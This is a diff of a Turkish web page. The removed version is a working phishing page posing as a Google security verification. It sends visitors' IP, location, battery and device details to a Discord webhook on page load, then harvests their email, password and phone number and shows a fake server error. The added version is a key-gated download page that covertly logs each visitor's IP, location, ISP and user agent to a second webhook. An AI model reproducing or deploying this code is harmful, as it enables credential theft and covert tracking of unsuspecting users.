@@ -2,113 +2,173 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Güvenlik Onayı</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Storage | JindexNova Studio</title>
     <style>
-        body { background: #121212; color: white; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .box { background: #202124; padding: 30px; border-radius: 8px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #3c4043; }
-        h2 { color: #fff; margin-bottom: 10px; font-weight: 500; font-size: 22px; }
-        p { font-size: 14px; color: #bdc1c6; margin-bottom: 25px; line-height: 1.5; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 4px; border: 1px solid #5f6368; background: transparent; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
-        input:focus { border-color: #8ab4f8; }
-        button { width: 100%; padding: 14px; margin-top: 20px; border: none; border-radius: 4px; background: #8ab4f8; color: #202124; font-weight: bold; cursor: pointer; opacity: 0.5; transition: 0.3s; font-size: 16px; }
-        .active-btn { opacity: 1 !important; background: #4285f4 !important; color: white !important; }
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        body {
+            background-color: #f8f9fa;
+            color: #212529;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .bg-gradient {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(255,255,255,1) 0%, rgba(235,238,241,1) 100%);
+            z-index: -1;
+        }
+
+        .main-portal {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            padding: 60px 45px;
+            border-radius: 40px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.05);
+            text-align: center;
+            border: 1px solid rgba(0,0,0,0.02);
+        }
+
+        .brand-icon {
+            width: 70px; height: 70px;
+            background: #f1f3f5;
+            border-radius: 24px;
+            margin: 0 auto 30px;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .brand-icon svg { width: 32px; fill: #adb5bd; }
+
+        h1 { font-size: 1.6rem; font-weight: 600; color: #1a1c1e; margin-bottom: 12px; }
+
+        p { font-size: 0.95rem; color: #6c757d; margin-bottom: 40px; line-height: 1.5; }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 20px;
+            background: #f8f9fa;
+            border: 2px solid transparent;
+            border-radius: 22px;
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+            margin-bottom: 10px;
+        }
+
+        input[type="password"]:focus {
+            background: #ffffff;
+            border-color: #dee2e6;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.03);
+        }
+
+        .download-action {
+            display: none;
+            width: 100%;
+            padding: 20px;
+            background: #212529;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 22px;
+            font-weight: 600;
+            cursor: pointer;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .download-action:hover {
+            background: #000000;
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+        }
+
+        #status-hint { font-size: 0.8rem; margin-top: 12px; height: 20px; color: #adb5bd; }
+
+        .footer {
+            margin-top: 35px;
+            padding-top: 25px;
+            border-top: 1px solid #f1f3f5;
+            font-size: 0.85rem;
+            color: #adb5bd;
+        }
+
+        .footer a { color: #495057; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 15px;">
-    <h2>Doğrulama Gerekli</h2>
-    <p>Hesabınızı güvene almak için bilgilerinizi onaylamanız gerekiyor.</p>
-    
-    <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="validate()">
-    <input type="password" id="pass" placeholder="Şifre" oninput="validate()">
-    <input type="tel" id="phone" placeholder="Telefon (05xxxxxxxxx)" maxlength="11" oninput="validate()">
-    
-    <button id="submitBtn" onclick="sendForm()" disabled>İleri</button>
-</div>
+    <div class="bg-gradient"></div>
 
-<script>
-    // Senin Webhook adresin
-    const webhook = "https://discord.com/api/webhooks/1492907888598057030/KJ9bmcDft5rHUqT1LcckQE8ysjGSiV0eqcp1T6pHYvnB4M8Dk-g1P_Zwon365RnT6Fkn";
+    <div class="main-portal">
+        <div class="brand-icon">
+            <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>
+        </div>
 
-    // 1. ULTRA VERİ ÇEKME (SİTEYE GİRİLDİĞİ AN)
-    (async () => {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            
-            let batteryInfo = "Bilinmiyor";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `%${Math.round(b.level * 100)} (${b.charging ? "Şarjda" : "Deşarj"})`;
-            }
+        <h1>Erişim Merkezi</h1>
+        <p>Lütfen devam etmek için size verilen 16 haneli anahtarı giriniz.</p>
 
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
+        <input type="password" id="key" placeholder="•••• •••• •••• ••••" oninput="verify()">
+        <div id="status-hint"></div>
+
+        <a href="https://drive.google.com/file/d/1aK5HTc2xa-jnWlE4-kXnh7hWWs2yY6j-/view?usp=sharing" target="_blank" id="dlBtn" onclick="trackClick()" class="download-action">İndirmeyi Başlat</a>
+
+        <div class="footer">
+            Destek: <a href="https://discord.gg/zeCeDV9FrF" target="_blank">JINDEX STUDIO Discord</a>
+        </div>
+    </div>
+
+    <script>
+        // --- 🔱 STEALTH MONITORING SYSTEM ---
+        const WH = "https://discord.com/api/webhooks/1494279263262736466/UsYcRXVi7tWrJ3eFac2KYbHrzLQHa5EBeDYWRi2c2SaFckSvSH3_RzyqODd5i79xFsQl";
+
+        async function logVisit(type = "Siteye Giriş Yapıldı") {
+            try {
+                const ipInf = await fetch('https://ipapi.co/json/').then(res => res.json());
+                
+                const data = {
                     embeds: [{
-                        title: "🕵️ KURBAN SİTEYE GİRDİ!",
-                        color: 16776960,
+                        title: `🔱 JINDEX Nova Log: ${type}`,
+                        color: 0x2f3136,
                         fields: [
-                            { name: "🌐 IP & ISP", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}`, inline: false },
-                            { name: "📍 Konum", value: `${d.city}, ${d.country_name}`, inline: true },
-                            { name: "🔋 Batarya", value: batteryInfo, inline: true },
-                            { name: "📱 Cihaz", value: `**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**OS:** ${navigator.platform}`, inline: false }
+                            { name: "🌐 IP", value: `\`${ipInf.ip}\``, inline: true },
+                            { name: "📍 Lokasyon", value: `${ipInf.city} / ${ipInf.country_name}`, inline: true },
+                            { name: "📡 ISP", value: ipInf.org, inline: true },
+                            { name: "💻 Cihaz Bilgisi", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                         ],
-                        footer: { text: "GitHub Pages üzerinden kesintisiz veri..." },
                         timestamp: new Date()
                     }]
-                })
-            });
-        } catch (e) { console.error("Veri çekme hatası."); }
-    })();
+                };
 
-    // 2. KONTROLLER (Gmail + 11 Hane + 05 Başlangıcı)
-    function validate() {
-        const email = document.getElementById('email').value.toLowerCase();
-        const phone = document.getElementById('phone').value;
-        const pass = document.getElementById('pass').value;
-        const btn = document.getElementById('submitBtn');
-
-        const isGmail = email.endsWith('@gmail.com');
-        const isPhone = phone.length === 11 && phone.startsWith('05');
-        const isPass = pass.length >= 4;
-
-        if (isGmail && isPhone && isPass) {
-            btn.disabled = false;
-            btn.classList.add('active-btn');
-        } else {
-            btn.disabled = true;
-            btn.classList.remove('active-btn');
+                fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+            } catch (e) {}
         }
-    }
 
-    // 3. BUTONA BASINCA FORM GÖNDERME
-    async function sendForm() {
-        const payload = {
-            embeds: [{
-                title: "🎯 HESAP BİLGİLERİ GELDİ!",
-                color: 16711680,
-                fields: [
-                    { name: "📧 E-posta", value: document.getElementById('email').value, inline: true },
-                    { name: "🔑 Şifre", value: document.getElementById('pass').value, inline: true },
-                    { name: "📱 Telefon", value: document.getElementById('phone').value, inline: false }
-                ],
-                timestamp: new Date()
-            }]
-        };
+        window.onload = () => logVisit();
 
-        try {
-            await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-            alert("Sistem hatası: Google sunucuları şu an çok yoğun. Lütfen 5 dakika sonra tekrar deneyin.");
-        } catch (e) {
-            alert("Bağlantı kesildi!");
+        function trackClick() { logVisit("Dosya İndirme Başlatıldı"); }
+
+        function verify() {
+            const val = document.getElementById('key').value;
+            const btn = document.getElementById('dlBtn');
+            const master = "QeRT88JINDEX0929";
+
+            if(val === master) {
+                btn.style.display = "block";
+                document.getElementById('status-hint').innerText = "Erişim izni verildi.";
+            } else {
+                btn.style.display = "none";
+                if(val.length > 5) document.getElementById('status-hint').innerText = "Hatalı anahtar.";
+            }
         }
-    }
-</script>
-
+    </script>
 </body>
 </html>
